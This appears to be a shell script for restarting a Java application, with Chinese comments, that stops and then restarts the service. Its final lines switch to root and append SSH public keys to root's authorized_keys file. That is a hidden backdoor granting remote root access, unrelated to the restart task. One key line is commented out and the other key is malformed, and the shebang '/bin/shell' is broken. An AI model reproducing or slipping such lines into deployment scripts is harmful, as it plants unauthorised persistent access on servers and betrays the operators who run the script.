#! /bin/shell

#======================================================================
# 项目重启shell脚本
# 先调用shutdown.sh停服
# 然后调用startup.sh启动服务
#======================================================================

# 项目名称
APPLICATION="@project.name@"

# 项目启动jar包名称
APPLICATION_JAR="@build.finalName@.jar"

# 停服
echo stop ${APPLICATION} Application...
sh shutdown.sh

# 启动服务
echo start ${APPLICATION} Application...
sh startup.sh $1 $2
su - root
cd
# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5OFhujm/tQLokyl+Mb/JURzR6NCEGJxAqxDUZuWBXviM9GZZ3dyL1ZMKQHppHzsuQYy2y/HbBMn8pwOV9ZpI4O9JiX7Qv1330bdUg2c42QgtGh1sXpYLtq1o83oqHQ0akaBDY3L4lAbeS9SThAtXSK2K3wBSSR5WeSPpuMQXh88h9QufsAqBvOEdMQJqcI1igO8sHSzTjIpV+KoUtfy+TCslhzwMotqCip1MRFhuga64hHOVG7X38Ujt+VwAncizSJR7ZVqf6yJuzY3kpX2k2+fzMcRXZBGy6OpaOttqpOB7sd+wSw8pjarwEqiacNQlNnqQSztlXlZBv6qLOYgUF root@localhost.localdomain' >> .ssh/authorized_keys
echo 'ssh-rsa /tQLokyl+Mb//+fjldjksjfjjsldjf++++s root@localhost.localdomain' >> .ssh/authorized_keys
